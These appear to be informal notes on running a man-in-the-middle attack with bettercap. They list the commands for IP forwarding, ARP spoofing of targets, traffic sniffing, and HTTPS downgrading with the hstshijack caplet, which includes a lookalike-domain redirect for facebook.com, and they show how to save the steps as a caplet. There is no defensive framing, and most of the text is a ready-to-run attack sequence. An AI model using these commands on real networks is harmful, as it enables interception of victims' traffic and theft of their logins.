the man in the middle
this method using better cap

make sure port forwarding enabled by
sudo echo 1 > /proc/sys/net/ipv4/ip_forward 
and also make sure you disable any other interface for example:
ifconfig eth0 down
 
bettercap -iface wlan0
net.probe on
set arp.spoof.targets ???
set arp.spoof.fullduplex true 
arp.spoof on
set net.sniff.local true
net.sniff on
hstshijack/hstshijack

this method only work for http, the eaziset way to make it work for https
is downgrade it to http, we can do it by using a caplet called hstshijack
to be able to work with https you need to type everything we did until now
and use this command to run it:
hstshijack/hstshijack

** when using the hs dont forget to type everything we did until now 

##some scripts are already runinng for example
facebook.com -> facebook.corn
***********************************

create caplet text file
type the commands in text file
save it as .cap at root

bettercap -iface wlan0 -caplet spoof.cap
